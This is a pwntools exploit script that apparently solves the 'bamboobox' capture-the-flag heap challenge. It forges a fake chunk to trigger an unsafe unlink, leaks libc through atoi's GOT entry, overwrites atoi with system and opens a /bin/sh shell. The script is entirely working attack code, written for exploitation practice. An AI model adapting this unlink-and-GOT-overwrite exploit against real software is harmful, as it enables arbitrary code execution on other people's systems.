from pwn import *
from time import sleep
p=process('./bamboobox')
context.log_level="debug"
libc=ELF('./libc-2.23.so')
elf=ELF('./bamboobox')
def add(size,content):
    p.sendlineafter('choice:',str(2))
    p.sendlineafter('name:',str(size))
    p.sendlineafter('item:',content)

def show():
    p.sendlineafter('choice:',str(1))

def change(index,size,content):
    p.sendlineafter('choice:',str(3))
    p.sendlineafter('item:',str(index))
    p.sendlineafter('name:',str(size))
    p.sendlineafter('item:',content)

def delete(index):
    p.sendlineafter('choice:',str(4))
    p.sendlineafter('item:',str(index))

sleep(2)
add(0x20,'aaaa')#0
add(0x80,'bbbb')#1
add(0x80,'cccc')#2
fd=0x6020d8-0x18
bk=0x6020d8-0x10
payload1=p64(0)+p64(0x81)#fake_chunk
payload1+=p64(fd)+p64(bk)
payload1+=p64(0)*12
payload1+=p64(0x80)+p64(0x90)
change(1,0x90,payload1)
delete(2)#unlink
change(1,0x20,'b'*8+p64(elf.got['atoi']))
show()
p.recvuntil(': ')
libc_base=u64(p.recv(6).ljust(8,'\x00'))-libc.sym['atoi']
print "libc_base:"+hex(libc_base)
change(0,0x20,p64(libc_base+libc.sym['system']))
p.recvuntil(':')
p.sendline('/bin/sh\x00')
p.interactive()
